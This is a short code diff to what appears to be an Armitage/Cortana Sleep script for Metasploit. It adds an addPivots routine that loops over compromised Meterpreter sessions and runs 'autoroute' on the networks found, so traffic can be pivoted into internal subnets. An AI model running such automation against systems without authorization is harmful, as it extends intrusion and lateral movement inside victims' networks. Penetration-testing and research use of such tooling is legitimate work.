@@ -12,7 +12,7 @@ command arguments {
 }
 
 on networkSearch {
-   local('$console $session @sessions @ips @masks %networks @info $sid $line @output $temp');
+   local('$console $session @sessions @ips @masks %networks @info $sid $line @output $temp $host $net');
    $console = console();
    @sessions = $1;
 
@@ -60,9 +60,9 @@ on networkSearch {
       @masks = @();
    }
 
-   foreach $sid (%networks) {
-      foreach $temp (%networks[$sid]) {
-         println("$sid" . "," . "$temp");
+   foreach $host (%networks) {
+      foreach $net (%networks[$host]) {
+         println("$host" . "," . "$net");
       }
    }
    addPivots(%networks, @sessions);
@@ -94,5 +94,24 @@ sub addNetworks {
 }
 
 sub addPivots {
-   
+   local('$console %networks @sessions $session @info $sid $host $net');
+   $console = console();
+   %networks = $1;
+   @sessions = $2;
+
+   on("meterpreter", $this);
+
+   foreach $session (@sessions) {
+      @info = split(",", $session);
+      $host = @info[1];
+
+      if ($host in %networks) {
+         $sid = @info[0];
+         cmd($console, "sessions -i $sid");
+         foreach $net (%networks[$host]) {
+            m_cmd($sid, "run autoroute $net ");
+            yield;
+         }
+      }
+   }
 }
